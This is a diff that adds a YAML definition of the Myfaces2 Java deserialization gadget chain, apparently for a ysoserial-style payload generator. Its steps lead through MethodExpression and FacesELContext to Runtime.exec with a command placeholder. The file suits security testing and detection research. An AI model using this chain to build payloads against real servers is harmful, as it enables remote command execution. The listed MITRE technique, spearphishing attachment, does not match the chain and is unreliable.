@@ -1,0 +1,24 @@
+name: "Myfaces2"
+category: "myfaces"
+description: "Myfaces2 gadget chain using MethodExpression and ELContext"
+jdk_version: "all"
+dependencies:
+  - name: "myfaces-impl"
+    version: "2.0-2.2"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/frohoff/ysoserial"
+steps:
+  - class_name: "javax.el.MethodExpression"
+    method_name: "invoke"
+    parameters: []
+  - class_name: "org.apache.myfaces.el.unified.FacesELContext"
+    method_name: "getELResolver"
+    parameters: []
+  - class_name: "java.lang.Runtime"
+    method_name: "exec"
+    parameters:
+      - "{command}"
